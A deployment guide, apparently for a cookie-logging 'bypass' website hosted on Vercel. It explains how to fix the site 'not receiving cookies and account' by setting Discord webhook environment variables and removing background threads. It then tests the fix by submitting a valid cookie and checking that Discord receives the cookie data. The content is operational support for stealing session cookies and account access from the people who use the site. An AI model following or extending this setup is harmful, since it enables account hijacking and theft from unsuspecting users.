# Vercel Deployment Guide

This guide explains how to fix the "not receiving cookies and account" and "bypass logs" issues when deploying to Vercel.

## The Problems

There were two main issues causing the deployment problems:

1. **Missing Environment Variables**: Vercel doesn't read `.env` files - webhook URLs need to be configured in Vercel's dashboard
2. **Background Threading Issue**: The original code used background threads which get killed on Vercel's serverless platform after the response is sent

## The Fixes

✅ **Fixed**: Environment variable configuration  
✅ **Fixed**: Removed background threading - now processes webhooks synchronously  
✅ **Added**: Comprehensive health checks at `/health/full`  
✅ **Added**: Better error logging and timeout handling

## Fix: Configure Environment Variables in Vercel

### Step 1: Access Your Vercel Project Settings

1. Go to [vercel.com](https://vercel.com) and log in
2. Click on your project name
3. Go to **Settings** tab
4. Click **Environment Variables** in the left sidebar

### Step 2: Add Required Environment Variables

Add these **two required variables**:

**Variable 1:**
- **Name**: `DISCORD_WEBHOOK_URL`
- **Value**: Your Discord webhook URL (from your `.env` file)
- **Environment**: Production (and Preview if you want)

**Variable 2:**
- **Name**: `BYPASS_WEBHOOK_URL` 
- **Value**: Your bypass webhook URL (from your `.env` file)
- **Environment**: Production (and Preview if you want)

### Step 3: Redeploy

After adding the environment variables:
1. Go to the **Deployments** tab
2. Click **Redeploy** on the most recent deployment
3. Make sure to select **Use existing Build Cache** = **No**

## How to Get Your Webhook URLs

If you don't have your webhook URLs:

1. Check your local `.env` file
2. Or create new Discord webhooks:
   - Go to your Discord server
   - Right-click a channel → Edit Channel → Integrations → Webhooks
   - Create webhook and copy the URL

## Testing the Fix

After redeploying with environment variables:

1. Visit your deployed site
2. Submit a test form with a valid cookie
3. Check Discord - you should receive both:
   - Main webhook (with cookie data)
   - Bypass logs webhook (clean data)

## Verifying Environment Variables

You can check if your environment variables are working by visiting:
`https://your-vercel-site.com/health`

This endpoint will test the Discord webhook connection and report if it's working.

## Common Issues

- **Still not working?** Make sure you redeployed after adding environment variables
- **Health check fails?** Double-check your webhook URL format
- **Only main webhook works?** Make sure you added both `DISCORD_WEBHOOK_URL` and `BYPASS_WEBHOOK_URL`